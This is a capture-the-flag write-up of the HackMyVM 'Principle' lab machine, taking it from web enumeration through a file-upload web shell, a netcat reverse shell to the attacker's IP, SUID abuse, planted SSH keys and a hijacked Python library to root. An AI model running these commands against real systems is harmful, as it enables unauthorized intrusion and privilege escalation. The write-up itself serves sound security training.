---
categories: [HackMyVM]
tags: [Fuzzing, RFI, SSH keys, SUIDs, python, subdomain, PrivEsc]  
image:
  path: /Vulnhub-Files/img/Principle/Untitled.png
  alt: Principle HackMyVM machine ⭐
---

## Description ⤵️

This machine is <kbd>*Principle*</kbd> , It is from HackMyVM Platform and categorized as Medium machine . 

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HackMyVM/Principle]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.72
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 23:47 IST
Nmap scan report for 10.0.2.72
Host is up (0.0010s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Welcome to nginx!
| http-robots.txt: 1 disallowed entry 
|_/hackme
MAC Address: 08:00:27:5A:FC:3E (Oracle VirtualBox virtual NIC)
```
{: .nolineno}

## Web Enumeration ⤵️

I found this page on port 80 →

![Untitled](/Vulnhub-Files/img/Principle/Untitled%201.png)

After Directory Traversal I got some directories like robots.txt file also →

![Untitled](/Vulnhub-Files/img/Principle/Untitled%202.png)

Now from its souce code I got one hint →

![Untitled](/Vulnhub-Files/img/Principle/Untitled%203.png)

Now I started doing file search through ffuf tool and I got this file `rainbow_mystery.txt` →

![Untitled](/Vulnhub-Files/img/Principle/Untitled%204.png)

Lets decode it first →

```bash
┌──(kali㉿kali)-[~/Downloads/HackMyVM/Principle]
└─$ echo 'QWNjb3JkaW5nIHRvIHRoZSBPbGQgVGVzdGFtZW50LCB0aGUgcmFpbmJvdyB3YXMgY3JlYXRlZCBi                              
eSBHb2QgYWZ0ZXIgdGhlIHVuaXZlcnNhbCBGbG9vZC4gSW4gdGhlIGJpYmxpY2FsIGFjY291bnQs
IGl0IHdvdWxkIGFwcGVhciBhcyBhIHNpZ24gb2YgdGhlIGRpdmluZSB3aWxsIGFuZCB0byByZW1p
bmQgbWVuIG9mIHRoZSBwcm9taXNlIG1hZGUgYnkgR29kIGhpbXNlbGYgdG8gTm9haCB0aGF0IGhl
IHdvdWxkIG5ldmVyIGFnYWluIGRlc3Ryb3kgdGhlIGVhcnRoIHdpdGggYSBmbG9vZC4KTWF5YmUg
dGhhdCdzIHdoeSBJIGFtIGEgcm9ib3Q/Ck1heWJlIHRoYXQgaXMgd2h5IEkgYW0gYWxvbmUgaW4g
dGhpcyB3b3JsZD8KClRoZSBhbnN3ZXIgaXMgaGVyZToKLS4uIC0tLSAtLSAuLSAuLiAtLiAvIC0g
Li4uLi0gLi0uLiAtLS0tLSAuLi4gLi0uLS4tIC4uLi4gLS0gLi4uLQo=
' | base64 -d
According to the Old Testament, the rainbow was created by God after the universal Flood. In the biblical account, it would appear as a sign of the divine will and to remind men of the promise made by God himself to Noah that he would never again destroy the earth with a flood.
Maybe that is why I am a robot?
Maybe that is why I am alone in this world?

The answer is here:
-.. --- -- .- .. -. / - ....- .-.. ----- ... .-.-.- .... -- ...-
```
{: .nolineno}

Now with cyberchef Tool I get the morse code encoded text →

![Untitled](/Vulnhub-Files/img/Principle/Untitled%205.png)

I got this `DOMAIN / t4l0s.hmv` , now I set the hosts file and loaded the site with new domain name as `t4l0s.hmv` and I got this →

![Untitled](/Vulnhub-Files/img/Principle/Untitled%206.png)

Now I searched for subdomains again and I got hit →

```bash
┌──(kali㉿kali)-[~/Downloads/HackMyVM/Principle]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.t4l0s.hmv" -u http://t4l0s.hmv/ -fs 615

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       'v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://t4l0s.hmv/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.t4l0s.hmv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 615
________________________________________________

hellfire                [Status: 200, Size: 1659, Words: 688, Lines: 52, Duration: 26ms]
:: Progress: [114441/114441] :: Job [1/1] :: 2597 req/sec :: Duration: [0:00:49] :: Errors: 0 ::
```
{: .nolineno}

`hellfire.t4l0s.hmv` lets see →

![Untitled](/Vulnhub-Files/img/Principle/Untitled%207.png)

Now with directory traversal on this domain I got upload.php page that takes input in image format only so lets upload our RFI payload with null byte to invade the image format issue →

![Untitled](/Vulnhub-Files/img/Principle/Untitled%208.png)

`upload.php` page looks like this →

![Untitled](/Vulnhub-Files/img/Principle/Untitled%209.png)

Now changed the uploaded file name to `.php` from `.php.gif` file →

![Untitled](/Vulnhub-Files/img/Principle/Untitled%2010.png)

the file was successfuly uploaded →

![Untitled](/Vulnhub-Files/img/Principle/Untitled%2011.png)

Now lets load this payload file now →

```bash
http://hellfire.t4l0s.hmv/archivos/command_shell.php?cmd=id
```
{: .nolineno}

![Untitled](/Vulnhub-Files/img/Principle/Untitled%2012.png)

Lets get reverse shell now →

```bash
http://hellfire.t4l0s.hmv/archivos/command_shell.php?cmd=nc%20-e%20/bin/bash%2010.0.2.60%204444
```
{: .nolineno}

In response to that I got the reverse shell →

```bash
┌──(kali㉿kali)-[~/Downloads/HackMyVM/Principle]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.0.2.60] from (UNKNOWN) [10.0.2.72] 52988
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@principle:~/hellfire.t4l0s.hmv/archivos$ whoami
whoami
www-data
www-data@principle:~/hellfire.t4l0s.hmv/archivos$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@principle:~/hellfire.t4l0s.hmv/archivos$
```
{: .nolineno}

Lets dig deeper for root access →

I found the SUIDs on `find` command →

```bash
bash-5.2$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find
/usr/bin/su
/usr/bin/bash
/usr/bin/chsh
/usr/bin/umount
/usr/bin/newgrp
bash-5.2$
```
{: .nolineno}

Now I used this command and got the access to talos user directories →

```bash
bash-5.2$ find . -exec /bin/sh -p \; -quit  
$ whoami
talos
$ id
uid=33(www-data) gid=33(www-data) euid=1000(talos) groups=33(www-data)
$ cd /home/talos
$ ls -al
total 44
drwxr-xr-x 4 talos talos    4096 Oct 10 01:37 .
drwxr-xr-x 4 root  root     4096 Jul  4 06:11 ..
-rw-r--r-- 1 talos talos      38 Oct 10 02:52 .bash_history
-rw-r----- 1 talos talos     261 Jul  5 07:56 .bash_logout
-rw-r----- 1 talos talos    3545 Jul 14 06:56 .bashrc
-rw------- 1 talos talos      20 Jul  4 18:24 .lesshst
drw-r----- 3 talos talos    4096 Jun 30 07:30 .local
-rw-r----- 1 talos talos     807 Jun 30 05:06 .profile
drwx------ 2 talos talos    4096 Oct 10 02:24 .ssh
-rwxr-xr-x 1 talos www-data  263 Oct 10 01:44 god.py
-rw-r----- 1 talos talos     320 Jul 13 15:42 note.txt
$ cat note.txt	
Congratulations! You have made it this far thanks to the manipulated file I left you, I knew you would make it!
Now we are very close to finding this false God Elohim.
I left you a file with the name of one of the 12 Gods of Olympus, out of the eye of Elohim ;)
The tool I left you is still your ally. Good luck to you.
$
```
{: .nolineno}

From `note.txt` I created a god names file that will search all the files containing that name →

```bash
import os
names = ['Zeus','Poseidón','Hera','Deméter','Afrodita','Atenea','Artemisa','Apolo','Ares','Hefesto','Hermes','Hestia','Dioniso']
for i in names :
        print('File Containing ' +i+' god name are : ')
        os.system('find / -type f 2>/dev/null | grep -i '+i)
```
{: .nolineno}

I got this output now →

```bash
bash-5.2$ python3 god.py
File Containing Zeus god name are : 
File Containing Poseidón god name are : 
File Containing Hera god name are : 
/usr/lib/modules/6.1.0-9-amd64/kernel/drivers/power/supply/cros_peripheral_charger.ko
/usr/share/zoneinfo/Antarctica/Rothera
/usr/share/zoneinfo/right/Antarctica/Rothera
File Containing Deméter god name are : 
File Containing Afrodita god name are : 
/etc/selinux/Afrodita.key
File Containing Atenea god name are : 
File Containing Artemisa god name are : 
File Containing Apolo god name are : 
File Containing Ares god name are : 
/usr/share/zoneinfo/Europe/Bucharest
/usr/share/zoneinfo/right/Europe/Bucharest
File Containing Hefesto god name are : 
File Containing Hermes god name are : 
File Containing Hestia god name are : 
File Containing Dioniso god name are : 
bash-5.2$
```
{: .nolineno}

Now I accessed this file `/etc/selinux/Afrodita.key` →

```bash
bash-5.2$ cat /etc/selinux/Afrodita.key
Here is my password:
Hax0rModeON

Now I have done another little trick to help you reach Elohim.
REMEMBER: You need the access key and open the door. Anyway, he has a bad memory and that is why he keeps the lock coded and hidd
en at home.
bash-5.2$
```
{: .nolineno}

Lets use this password →

```bash
bash-5.2$ su talos
Password: 
talos@principle:~$ whoami
talos
talos@principle:~$ id
uid=1000(talos) gid=1000(talos) groups=1000(talos),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(n
etdev)
talos@principle:~$ sudo -l
Matching Defaults entries for talos on principle:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User talos may run the following commands on principle:
    (elohim) NOPASSWD: /bin/cp
talos@principle:~$
```
{: .nolineno}

Now I tried to replace the shadow or passwd file but no luck as it is done from elohim user privileegs I think I have to include the attackers ssh keys inside the elohim `.ssh` directory to get the shell →

The Attacker created the ssh key like this →

```bash
┌──(kali㉿kali)-[~/Downloads/HackMyVM/Principle]
└─$ ssh-keygen          
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:GeUnYF9iQqmFDOaAyR2IJlDwHShEJwIADZ1mDqFG5yQ kali@kali
The key is randomart image is:
+---[RSA 3072]----+
|^E=B=o o=.+ .    |
|@=#* .o.oB o     |
|+B..o  o. + .    |
|. .   .  o o     |
|        S        |
|                 |
|                 |
|                 |
|                 |
+----[SHA256]-----+

┌──(kali㉿kali)-[~/Downloads/HackMyVM/Principle]
└─$ cp id_rsa.pub authorized_keys                                    
                                                                                                                                
┌──(kali㉿kali)-[~/Downloads/HackMyVM/Principle]
└─$ nano authorized_keys

┌──(kali㉿kali)-[~/Downloads/HackMyVM/Principle]
└─$ cat authorized_keys          
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCrXvdrOqD8zFEl8IyJWB2gaah+PWtpRItU0+764XzL4l7bqPBpuLQSBqI13AERH/ar+K6vPCVMIb/ScuCiB7vs45S4TanJX8RLN33MbJtSAZwkRbNcroFmkX0rbODoaeRFLFb4F5JJrAXJ0OIoeIEoigkFMvAn272xwJ5dJ675hmvViVLW5L3O+Wma4rFXAea8jNcnVjN0fq+whaM/64vavQCUSfzWgRpLbyTsgRsmQsg96dyLY8q7TuA5qg5PNUjXNQO/j7JyNNjv7n2/fpT1Kyf3Lanis2wHLhDYz88IlWsUkGgZdAsC+g2WfNuaI+s840F2usdsmMEWxp5dWKCSCHc+aT7ceBFwLRk8L4aXC+VEiBZY1gtLkZYV6Y66kD5ef2buxfnqYq+7afw390q5We0mC2JiwXiDe/LvspXGL0EwbHt69X6imPdlJk9h1ZRvMF+MzsJ6xI8dtr1vMJsHzu2jnW+C01r+Q43nIbUPoTvIVHkQjb0DWN5kYBdSD0= elohim@10.0.2.72

```
{: .nolineno}

Now lets transfer these 2 files into victim machine and put it in there location →

```bash
talos@principle:~$ cd /tmp
talos@principle:/tmp$ wget http://10.0.2.60/id_rsa
--2023-10-10 02:09:37--  http://10.0.2.60/id_rsa
Connecting to 10.0.2.60:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2590 (2.5K) [application/octet-stream]
Saving to: ‘id_rsa’

id_rsa              100%[===================>]   2.53K  --.-KB/s    in 0s      

2023-10-10 02:09:37 (173 MB/s) - ‘id_rsa’ saved [2590/2590]

talos@principle:/tmp$ wget http://10.0.2.60/authorized_keys
--2023-10-10 02:09:50--  http://10.0.2.60/authorized_keys
Connecting to 10.0.2.60:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 570 [application/octet-stream]
Saving to: ‘authorized_keys’

authorized_keys     100%[===================>]     570  --.-KB/s    in 0s      

2023-10-10 02:09:50 (102 MB/s) - ‘authorized_keys’ saved [570/570]

talos@principle:/tmp$ chmod 600 id_rsa
talos@principle:/tmp$ sudo -u elohim cp authorized_keys /home/gehenna/.ssh/authorized_keys
```
{: .nolineno}

Now I looked into the network connection and I got one internal connection for ssh →

```bash
talos@principle:/tmp$ ss -tunlp
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
udp   UNCONN 0      0            0.0.0.0:68        0.0.0.0:*          
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*          
tcp   LISTEN 0      128          0.0.0.0:3445      0.0.0.0:*          
tcp   LISTEN 0      511             [::]:80           [::]:*          
tcp   LISTEN 0      128             [::]:3445         [::]:*          
talos@principle:/tmp$ 
talos@principle:/tmp$ 
talos@principle:/tmp$ nc 127.0.0.1 3445
SSH-2.0-OpenSSH_9.2p1 Debian-2
^C
talos@principle:/tmp$ ssh
bash: /usr/bin/ssh: Permission denied
talos@principle:/tmp$
```
{: .nolineno}

Now on Attackers machine I transfered the ssh executable to the victim machine →

```bash
┌──(kali㉿kali)-[~/Downloads/HackMyVM/Principle]
└─$ whereis ssh                               
ssh: /usr/bin/ssh /etc/ssh /usr/share/man/man1/ssh.1.gz
                                                                                                                                
┌──(kali㉿kali)-[~/Downloads/HackMyVM/Principle]
└─$ cp /usr/bin/ssh .
```
{: .nolineno}

through wget and now its time to get elohim shell →

```bash
talos@principle:/tmp$ wget http://10.0.2.60/ssh
--2023-10-10 02:19:49--  http://10.0.2.60/ssh
Connecting to 10.0.2.60:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1129504 (1.1M) [application/octet-stream]
Saving to: ‘ssh.1’

ssh.1               100%[===================>]   1.08M  --.-KB/s    in 0.02s   

2023-10-10 02:19:49 (67.4 MB/s) - ‘ssh.1’ saved [1129504/1129504]

talos@principle:/tmp$ chmod +x ssh.1
talos@principle:/tmp$ ./ssh.1
usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface] [-b bind_address]
           [-c cipher_spec] [-D [bind_address:]port] [-E log_file]
           [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file]
           [-J destination] [-L address] [-l login_name] [-m mac_spec]
           [-O ctl_cmd] [-o option] [-P tag] [-p port] [-Q query_option]
           [-R address] [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]]
           destination [command [argument ...]]
```
{: .nolineno}

Now elohim SSH time →

```bash
talos@principle:/tmp$ ./ssh.1 -i id_rsa elohim@localhost -p 3445
The authenticity of host '[localhost]:3445 ([::1]:3445)' cant be established.
ED25519 key fingerprint is SHA256:DKEXWHITnUq09/ftlMqD6Eo+e5eQoeR+HWleDkUB9fw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[localhost]:3445' (ED25519) to the list of known hosts.

Son, you did not listen to me, and now you are trapped.
You have come a long way, but this is the end of your journey.

elohim@principle:~$ whoami
elohim
elohim@principle:~$ id
uid=1001(elohim) gid=1001(elohim) groups=1001(elohim),1002(sml)
elohim@principle:~$ cd ~
bash: cd: restricted
elohim@principle:~$ pwd
/home/gehenna
elohim@principle:~$ ls -al
total 40
drwxr-xr-x 4 elohim elohim 4096 Jul 14 11:25 .
drwxr-xr-x 4 root   root   4096 Jul  4 06:11 ..
-rw------- 1 elohim elohim  289 Jul 14 06:38 .bash_history
-rw-r----- 1 elohim elohim  261 Jul  5 08:13 .bash_logout
-rw-r----- 1 elohim elohim 3830 Jul 14 06:37 .bashrc
-rw-r----- 1 elohim elohim  777 Jul 13 17:19 flag.txt
drw-r----- 3 elohim elohim 4096 Jul  2 20:52 .local
-rw-r----- 1 elohim elohim   21 Jul 12 05:35 .lock
-rw-r----- 1 elohim elohim  807 Jul  6 06:28 .profile
drwx------ 2 elohim elohim 4096 Jul  6 11:05 .ssh
elohim@principle:~$ 
elohim@principle:~$ less flag.txt
WARNING: terminal is not fully functional
Press RETURN to continue 
                           _
                          _)\.-.
         .-.__,___,_.-=-. )\`  a`\_
     .-.__\__,__,__.-=-. `/  \     `\
     {~,-~-,-~.-~,-,;;;;\ |   '--;`)/
      \-,~_-~_-,~-,(_(_(;\/   ,;/
       ",-.~_,-~,-~,)_)_)'.  ;;(
         `~-,_-~,-~(_(_(_(_\  `;\
   ,          `"~~--,)_)_)_)\_   \
   |\              (_(_/_(_,   \  ;
   \ '-.       _.--'  /_/_/_)   | |
    '--.\    .'          /_/    | |
        ))  /       \      |   /.'
       //  /,        | __.'|  ||
      //   ||        /`    (  ||
     ||    ||      .'       \ \\
     ||    ||    .'_         \ \\
      \\   //   / _ `\        \ \\__
       \'-'/(   _  `\,;        \ ;--:,
        `"`  `"` `-,,;         `"`",,;

'CONGRATULATIONS, you have defeated me!

The flag is:
FLAGFLAGFLAG
                                                                              
elohim@principle:~$
```
{: .nolineno}

Now lets get to root →

```bash
elohim@principle:~$ sudo -l
Matching Defaults entries for elohim on principle:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User elohim may run the following commands on principle:
    (root) NOPASSWD: /usr/bin/python3 /opt/reviewer.py
elohim@principle:~$ ls -al /opt/reviewer.py
-rwxr-xr-x 1 root root 1072 Jul  7 15:17 /opt/reviewer.py
elohim@principle:~$ id
uid=1001(elohim) gid=1001(elohim) groups=1001(elohim),1002(sml)
elohim@principle:~$
```
{: .nolineno}

Lets see `reviewer.py` file →

```bash
elohim@principle:~$ less /opt/reviewer.py
WARNING: terminal is not fully functional
Press RETURN to continue 
#!/usr/bin/python3

import os
import subprocess

def eliminar_archivos_incorrectos(directorio):
    extensiones_validas = ['.jpg', '.png', '.gif']
    
    for nombre_archivo in os.listdir(directorio):
        archivo = os.path.join(directorio, nombre_archivo)
        
        if os.path.isfile(archivo):
            _, extension = os.path.splitext(archivo)
            
            if extension.lower() not in extensiones_validas:
                os.remove(archivo)
                print(f"Archivo eliminado: {archivo}")

directorio = '/var/www/hellfire.t4l0s.hmv/archivos'

eliminar_archivos_incorrectos(directorio)

def enviar_mensaje_usuarios_conectados():
    proceso = subprocess.Popen(['who'], stdout=subprocess.PIPE)
    salida, _ = proceso.communicate()
    lista_usuarios = salida.decode().strip().split('\n')
    usuarios_conectados = [usuario.split()[0] for usuario in lista_usuarios]
    mensaje = f"I have detected an intruder, stealing accounts: {', '.join(usuar
ios_conectados)}"
    subprocess.run(['wall', mensaje])
:
enviar_mensaje_usuarios_conectados()
elohim@principle:~$
```
{: .nolineno}

Lets see the permissions of there libraries →

```bash
elohim@principle:~$ find / -name subprocess.py 2>/dev/null
/usr/lib/python3.11/subprocess.py
/usr/lib/python3.11/asyncio/subprocess.py
elohim@principle:~$ ls -al /usr/lib/python3.11/subprocess.py
-rw-rw-r-- 1 root sml 85745 Jul 11 19:04 /usr/lib/python3.11/subprocess.py
elohim@principle:~$ find / -name os.py 2>/dev/null        
/usr/lib/python3.11/os.py
elohim@principle:~$ ls -al /usr/lib/python3.11/os.py
-rw-r--r-- 1 root root 39504 Mar 13  2023 /usr/lib/python3.11/os.py
elohim@principle:~$
```
{: .nolineno}

I can see I have write permission on `subprocess.py` file so lets add our own os module system commmands →

```bash
elohim@principle:~$ echo 'import os
> os.system("chmod +s /bin/bash")' >> /usr/lib/python3.11/subprocess.py
elohim@principle:~$ ls -al /bin/bash           
-rwxr-xr-x 1 root root 1265648 Apr 23 17:23 /bin/bash
elohim@principle:~$ sudo python3 /opt/reviewer.py
                                                                               
elohim@principle:~$ ls -al /bin/bash 
-rwsr-sr-x 1 root root 1265648 Apr 23 17:23 /bin/bash
elohim@principle:~$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# id
uid=1001(elohim) gid=1001(elohim) euid=0(root) egid=0(root) groups=0(root),1001(elohim),1002(sml)
bash-5.2# cd /root
bash-5.2# ls -al
total 40
drwx------  5 root root 4096 Jul 14 11:28 .
drwxr-xr-x 18 root root 4096 Jul 11 17:43 ..
-rw-------  1 root root    0 Jul 14 11:28 .bash_history
-rw-r--r--  1 root root  597 Jul  7 15:25 .bashrc
drwx------  3 root root 4096 Jul  3 17:51 .config
-rw-------  1 root root   20 Jul  6 08:04 .lesshst
drwxr-xr-x  3 root root 4096 Jun 30 05:12 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root  478 Jul  7 15:38 root.txt
-rw-r--r--  1 root root   66 Jul  6 07:06 .selected_editor
drwx------  2 root root 4096 Jul 13 18:54 .ssh
bash-5.2# cat root.txt
CONGRATULATIONS, the system has been pwned!

          _______
        @@@@@@@@@@@
      @@@@@@@@@@@@@@@
     @@@@@@@222@@@@@@@
    (@@@@@/_____\@@@@@)
     @@@@(_______)@@@@
      @@@{ " L " }@@@
       \@  \ - /  @/
        /    ~    \
      / ==        == \
    <      \ __ /      >
   / \          |    /  \
 /    \       ==+==       \
|      \     ___|_         |
| \//~~~|---/ * ~~~~  |     }
{  /|   |-----/~~~~|  |    /
 \_ |  /           |__|_ /

FLAGFLAGFLAG
                                                                               
Broadcast message from root@principle (somewhere) (Tue Oct 10 02:40:01 2023):  
                                                                               
I have detected an intruder, stealing accounts: elohim
```
{: .nolineno}

I am root now !!

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }